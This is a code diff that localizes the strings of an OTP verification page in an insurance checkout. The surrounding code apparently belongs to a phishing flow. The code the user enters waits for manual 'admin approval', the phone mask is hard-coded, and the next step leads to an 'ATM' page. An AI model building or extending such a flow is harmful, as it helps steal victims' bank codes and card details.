@@ -6,10 +6,13 @@ import { Shield, Lock, RefreshCw, Smartphone, Loader2 } from "lucide-react";
 import InsuranceStepper from "@/components/InsuranceStepper";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
 import { toast } from "sonner";
+import { useLanguage } from "@/i18n/LanguageContext";
 
 const OTPVerification = () => {
   const navigate = useNavigate();
   const location = useLocation();
+  const { t } = useLanguage();
+  const o = t.otp;
   const offer = location.state?.offer;
   const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
 
@@ -33,11 +36,11 @@ const OTPVerification = () => {
 
   useEffect(() => {
     if (approvalStatus === "approved") {
-      toast.success("تم التحقق بنجاح");
+      toast.success(o.verified);
       sessionStorage.setItem("insurance_order_id", orderId!);
       navigate("/insurance/atm", { state: { offer, orderId } });
     } else if (approvalStatus === "rejected") {
-      toast.error("تم رفض رمز التحقق");
+      toast.error(o.rejected);
       setWaitingApproval(false);
       setLoading(false);
     }
@@ -88,13 +91,13 @@ const OTPVerification = () => {
                 {waitingApproval ? (
                   <div className="space-y-4 py-4">
                     <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto" />
-                    <h3 className="text-sm font-bold text-foreground">بانتظار موافقة الإدارة...</h3>
-                    <p className="text-xs text-muted-foreground">يرجى الانتظار حتى تتم مراجعة رمز التحقق</p>
+                    <h3 className="text-sm font-bold text-foreground">{o.waitingApproval}</h3>
+                    <p className="text-xs text-muted-foreground">{o.waitingReview}</p>
                   </div>
                 ) : (
                   <>
-                    <h2 className="text-lg md:text-xl font-bold text-foreground mb-2">أدخل رمز التحقق</h2>
-                    <p className="text-xs md:text-sm text-muted-foreground mb-1">تم إرسال رمز التحقق المكون من 6 أرقام إلى</p>
+                    <h2 className="text-lg md:text-xl font-bold text-foreground mb-2">{o.title}</h2>
+                    <p className="text-xs md:text-sm text-muted-foreground mb-1">{o.subtitle}</p>
                     <p className="text-xs md:text-sm font-bold text-foreground mb-6 md:mb-8 flex items-center justify-center gap-1" dir="ltr">
                       <Lock className="w-3 h-3 text-primary" />05•••••89
                     </p>
@@ -112,25 +115,25 @@ const OTPVerification = () => {
                     <div className="mb-6">
                       {canResend ? (
                         <button onClick={handleResend} className="flex items-center gap-2 text-sm text-primary hover:text-primary/80 mx-auto font-medium transition-colors">
-                          <RefreshCw className="w-4 h-4" />إعادة إرسال الرمز
+                          <RefreshCw className="w-4 h-4" />{o.resendCode}
                         </button>
                       ) : (
                         <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-4 py-1.5">
-                          <span className="text-xs text-muted-foreground">إعادة الإرسال خلال</span>
+                          <span className="text-xs text-muted-foreground">{o.resendIn}</span>
                           <span className="text-sm text-primary font-bold font-mono">{fmtTime(timer)}</span>
                         </div>
                       )}
                     </div>
 
                     <Button onClick={handleVerify} disabled={loading || otp.join("").length !== 6} className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm md:text-base gap-2">
-                      <Lock className="w-4 h-4" />{loading ? "جاري التحقق..." : "تأكيد الدفع"}
+                      <Lock className="w-4 h-4" />{loading ? o.verifying : o.confirmPayment}
                     </Button>
                   </>
                 )}
 
                 <div className="flex items-center justify-center gap-2 mt-6 pt-4 border-t border-border">
                   <Shield className="w-4 h-4 text-primary/60" />
-                  <span className="text-xs text-muted-foreground">عملية آمنة ومشفرة بالكامل</span>
+                  <span className="text-xs text-muted-foreground">{o.secureProcess}</span>
                 </div>
               </div>
             </motion.div>
